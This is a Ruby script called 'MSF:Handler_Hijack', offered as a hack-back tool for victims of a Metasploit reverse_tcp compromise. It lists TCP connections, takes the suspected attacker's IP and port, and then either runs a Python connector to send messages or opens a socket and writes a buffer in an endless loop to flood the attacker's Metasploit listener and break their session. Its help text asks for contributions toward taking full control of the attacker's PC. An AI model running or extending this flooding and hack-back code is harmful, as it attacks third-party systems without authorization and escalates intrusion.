require 'socket'
require 'colorize'

def main()

    def python_connect
        begin
            puts "[*] HOST = #{$host}".blue
            puts "[*] PORT = #{$port}".blue
            
            puts "[!] Executing pyConnector.".cyan
            system("python3 pyConnector.py")

            puts "[*] Session Ended.".yellow
        rescue Interrupt => e 
            puts "[RUBY] OK.".yellow

        end

    end
    

    system("clear")

    puts "                   
     ______________________________________________________________________________
    |                       |    MSF:Handler_Hijack      |                         | 
    |                       |       Version : 1          |                         |
    |                       |____________________________|                         |                             
    |                                                                              |
    |                        help:  [   View Usage and How to ]                    |
    |                        V:     [   View TCP Connections  ]                    |
    |                        E:     [   Skip the Above part   ]                    |
    |                        exit:  [         Exit            ]                    |                               
    |                                                                              |
    |______________________________________________________________________________|
    |                                                                              |
    | https://github.com/fastisbac/handlerhijack            http://fastcorp.co.nf  |
    |______________________________________________________________________________|
    ".bold


    print "[+] [V]iew TCP Connections or [E]nter it Manually : ".yellow
    command = STDIN.gets

    if command =~ /^V/
        puts "[*] View TCP Connections.".blue
        system("netstat -at")

    elsif command =~ /^E/ 
        puts "[*] OK.".blue

    elsif command =~ /^help/
        system("clear")
        puts "
         Help
         ===================================
         MSF:Handler_Hijack is a Tool Designed for Systems Compromised by
         Metasploit Multi/Handler and Reverse_tcp payload. 

         This tool breaks the Connection and Connects itself to it. While the Meterpreter Session
         for them Died and then Connected back (to us) The Attacker won't be able to Use the Meterpreter.

         Currently I was able to do these to things when Connected. Spam them
         that causes lag (tested 90% works) and Send them Message. Sending Message with Ruby did not work
         as the Message was not appearing in the MSF Console. So, I tried with Python and it did.
         So there are two ways to Connect. Python and Ruby.
         ====================================
         How to 
         ====================================
         Everythings Automated.
         
         ====================================
         Contribute 
         -------------------------
         Submit any Suggestions and Ideas at GitHub! I want to add this feature of fully taking control over
         the Attackers PC. Help me do it. Contribute.
         ====================================
        ".bold
        STDIN.gets
        main
    elsif command =~ /^exit/
        abort

    else
        puts "[-] 404.".red
        STDIN.gets
        main

    end

   

    print "[!] Enter the IP of Connection you Suspect (EG : 0.0.0.0) : "
    $host = STDIN.gets.chop

    print "[!] Enter the Port of Connection you Suspect (EG : 4444) : "
    $port = STDIN.gets.chop 

    puts "[+] OK".light_green


    puts "[*] Opening Buffer File.".yellow
    buffer = File.open("buffer", "r")

    puts "[*] Creating Stage File.".yellow
    stage = File.open("stage", "w")

    print "
            Select Connection Type
           ====================================
           |
           + [1] Python Connector (Using Python Sockets. We can Send them a Message.)

           |
           + [2] Ruby Connector (Using Ruby Sockets. Spam them with 0101 that causes Lag)

           =============>"
    con = STDIN.gets

    if con =~ /^1/
        puts "[+] Using Python Sockets to Connect.".yellow
        python_connect
        sleep(3)
        main
    
    elsif con =~ /^2/
        puts "[*] Using Current (Ruby) Sockets to Connect.".yellow
        
    else
        puts "[-] Cannot Continue without Connection.".red
        sleep(3)
        main
    end

    



    begin
        puts "[+] Connecting to #{$host} on port #{$port}".light_green
        connection = TCPSocket.open($host, $port)
        while msg = connection.gets 
            puts "[+] Connected!".light_green
            puts "[+] They will not be able to Interact with the Meterpreter. Spamming him with Buffer.".light_blue
            puts "[+] Writing Recived Stage to File.".light_blue    
            loop do
                connection.write(buffer) # Spam.
            end
        end
    
    rescue => err
        puts "[-] Error : #{err}".red
        sleep(3)
        main
        
    end

    STDIN.gets
    main
    

end


main